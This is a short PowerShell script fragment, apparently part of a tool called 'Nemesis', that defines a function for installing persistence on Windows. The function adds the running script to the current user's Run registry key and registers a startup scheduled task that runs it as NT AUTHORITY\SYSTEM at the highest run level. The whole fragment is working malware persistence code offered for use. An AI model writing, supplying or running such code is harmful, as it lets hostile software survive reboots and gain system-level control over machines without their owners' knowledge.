# ============================================================
# NEMESIS — PERSISTENCE INSTALLER
# ============================================================

function Install-NemesisPersistence {
    Write-Host "🟢 Nemesis: Installing persistence..." -ForegroundColor Cyan

    # Registry persistence (Windows)
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "Nemesis" -Value $MyInvocation.MyCommand.Path -Force

    # Scheduled task (System)
    $taskName = "NemesisUpdate"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File $MyInvocation.MyCommand.Path"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User "NT AUTHORITY\SYSTEM" -RunLevel Highest

    Write-Host "🟢 Nemesis: Persistence installed." -ForegroundColor Green
}
